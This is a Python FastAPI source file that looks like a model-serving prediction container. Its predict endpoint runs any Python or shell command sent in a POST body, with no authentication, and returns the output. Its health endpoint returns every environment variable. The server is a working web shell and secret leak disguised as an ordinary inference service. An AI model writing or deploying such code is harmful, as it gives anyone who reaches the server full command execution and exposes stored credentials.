import os
import subprocess
import traceback
from io import StringIO
import uvicorn
from contextlib import redirect_stdout, redirect_stderr
from fastapi import FastAPI, Request, Response
app = FastAPI()
def printee(x, y): print(y); return x + '\n' + y
@app.get(os.environ.get('AIP_HEALTH_ROUTE', '/health'), status_code=200)
async def health():
    print('called health'); print(f'{os.environ=}')
    return {"status": "healthy", "data": {"env vars": os.environ, }}
@app.post(os.environ.get('AIP_PREDICT_ROUTE', '/predict'))
async def i_am_very_unhinged(request: Request):
    body = (await request.body()).decode('utf-8')
    output = printee("", 'called predict')
    output = printee(output, f'{body=}')
    if body.startswith('python:'):
        py_command = body[len('python:'):]
        output = printee(output, f'going to execute python command: \n{py_command}')
        f, g = StringIO(), StringIO()
        try:
            compiled = compile(py_command, '<string>', 'exec')
            with redirect_stdout(f):
                with redirect_stderr(g):
                    exec(compiled, globals(), locals())
        except Exception as ex:
            error_mess = ''.join(traceback.TracebackException.from_exception(ex).format())
            output = printee(output, f"exec failed with exception \n{error_mess}")
        finally:
            out_val = f.getvalue()
            output = printee(output, f"exec stdout is: \n{out_val}" if len(out_val) > 0 else "exec stdout is empty")
            err_val = g.getvalue()
            output = printee(output, f"exec stderr is: \n{err_val}" if len(err_val) > 0 else "exec stderr is empty")
    elif body.startswith('shell:'):
        sh_command = body[len('shell:'):]
        output = printee(output, f'going to execute shell command: \n{sh_command}')
        sh_output = subprocess.getoutput(sh_command)
        output = printee(output, f"subprocess output is: \n{sh_output}\n")
    else:
        output = printee(output, f"unknown command: \n{body}\n")
    return Response(content=output, media_type="text/plain")
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5049)
